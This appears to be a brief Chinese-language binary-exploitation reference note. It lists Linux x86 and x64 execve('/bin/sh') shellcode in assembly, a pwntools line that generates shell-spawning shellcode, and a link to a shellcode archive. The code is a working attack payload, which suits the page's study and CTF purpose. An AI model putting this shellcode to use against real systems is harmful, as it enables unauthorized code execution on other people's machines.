# Shellcode

```asm
# linux/x86 execve("/bin/sh", 0, 0)
global _start
_start:
    push "/sh"
    push "/bin"
    mov  ebx, esp ;; pathname = "/bin/sh"
    xor  edx, edx ;; argv = 0
    xor  ecx, ecx ;; envp = 0
    mov  al, 0xb  ;; execve
    int  0x80     ;; syscall
```

```asm
# linux/x64 execve("/bin/sh", 0, 0)
global _start
_start:    
    mov  rbx, "/bin/sh"
    push rbx
    push rsp
    pop  rdi
    xor  esi, esi
    xor  edx, edx
    push 0x3b
    pop  rax
    syscall
```

可以利用 pwntools 来生成特定架构和系统的 shellcode.  

```py
from pwn import*
context(log_level = 'debug', arch = 'i386', os = 'linux') # linux/x86
shellcode = asm(shellcraft.sh())
```

## 拓展

- <http://shell-storm.org/shellcode/>
